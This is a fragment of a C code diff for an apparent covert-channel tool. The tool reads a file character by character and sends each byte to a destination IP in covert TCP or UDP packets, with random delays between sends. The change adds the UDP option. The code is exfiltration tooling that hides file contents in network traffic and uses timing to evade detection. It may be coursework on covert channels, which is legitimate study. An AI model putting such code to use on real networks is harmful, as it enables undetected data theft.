@@ -46,7 +46,7 @@ void recv_results(char* sip, unsigned short sport, char* filename, bool tcp) {
     }
 }
 
-void send_results(char *sip, char *dip, unsigned short sport, unsigned short dport, char *filename) {
+void send_results(char *sip, char *dip, unsigned short sport, unsigned short dport, char *filename, bool tcp) {
     FILE *file;
     char input;
     clock_t start;
@@ -61,7 +61,11 @@ void send_results(char *sip, char *dip, unsigned short sport, unsigned short dpo
 
     while((input = fgetc(file)) != EOF) {
         printf("Character to send: %d\n", input);
-        covert_send(sip, dip, sport, dport, (unsigned char *) &input, 1); //send the packet
+        if(tcp){
+            covert_send(sip, dip, sport, dport, (unsigned char *) &input, 1); //send the packet
+        } else {
+            covert_udp_send(sip, dip, sport, dport, (unsigned char *) &input, 1);
+        }
         start = clock();    //start of clock
         timer_complete = 0;    //reset the timer again
         delay = rand_delay(max_delay);
@@ -91,12 +95,9 @@ int rand_delay(int delay) {
 
 void covert_udp_send_data(char *sip, char *dip, unsigned short sport, unsigned short dport, char* data, int covert_channel){
     unsigned char *buf = 0;
-    if(covert_channel == 1){
     covert_udp_send(sip,dip,sport,dport,(unsigned char*) buf,4);
     sleep(1);
-    } else {
 
-    }
     for(int i = 0; i<= (int)strlen(data); i++){
         printf("data[%d] = %c\n",i,data[i]);
         covert_udp_send(sip,dip,sport,dport,(unsigned char*) &data[i],1);
